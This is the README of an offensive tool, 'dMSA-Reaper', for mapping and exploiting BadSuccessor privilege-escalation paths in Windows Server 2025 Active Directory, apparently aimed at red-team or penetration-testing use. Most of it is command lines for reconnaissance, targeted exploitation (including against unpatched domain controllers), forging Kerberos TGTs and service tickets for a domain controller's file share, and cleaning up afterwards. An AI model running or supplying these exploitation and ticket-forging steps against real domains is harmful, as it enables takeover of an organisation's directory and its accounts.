# dMSA-Reaper

dMSA-Reaper maps and exploits BadSuccessor paths in Windows Server 2025
Active Directory.

## Install

```bash
python3 -m venv .venv
. .venv/bin/activate
pip install .
```

## Exploit a known target

```bash
dmsa-reaper exploit \
  -d corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps \
  --target victim --dry-run

dmsa-reaper exploit \
  -d corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps \
  --target victim --confirm
```

`--target` maps just that account and runs the path if there's exactly one.
Multiple paths: narrow with `--path`, `--primitive`, or `--container-dn`.

## Recon a domain first

```bash
dmsa-reaper map -d corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps

dmsa-reaper paths --state state.json          # --legacy for unpatched DCs

dmsa-reaper exploit --state state.json --path BS-7f31... --dry-run

dmsa-reaper exploit --state state.json --path BS-7f31... --confirm \
  -d corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps   # same account/DC as map
```

## Tickets

Either form prints an operation ID.

```bash
dmsa-reaper tgt --op OP-YYYYMMDD-deadbeef \
  --ccache /secure/operator.ccache --identity analyst

dmsa-reaper ticket --op OP-YYYYMMDD-deadbeef \
  --ccache /secure/operator.ccache --identity analyst \
  --spn cifs/dc01.corp.local
```

Artifacts land under `.reaper/runs/<operation-id>/`; each SPN gets its own
cache and handoff script.

## Cleanup

```bash
dmsa-reaper cleanup --op OP-YYYYMMDD-deadbeef -u analyst -p 'pass' --use-ldaps
```

Restores an attribute only while it still holds the operation's value, removes
only the ACEs the operation added, deletes a created object only if its
`objectGUID` still matches the journal. Conflicts are left untouched and exit
non-zero. Journals live in `.reaper/operations`.

## Kerberos

```bash
export KRB5CCNAME=/secure/operator.ccache
dmsa-reaper map -d corp.local --dc-ip 10.0.0.10 -u analyst -k
```

Pass `-u` with `-k` so the tool can match the ccache identity to the mapped
SID. NTLM, LDAPS, STARTTLS, and ccache SASL/GSSAPI work for LDAP; pass-the-hash,
AES keys, and keytabs aren't consistently supported there.
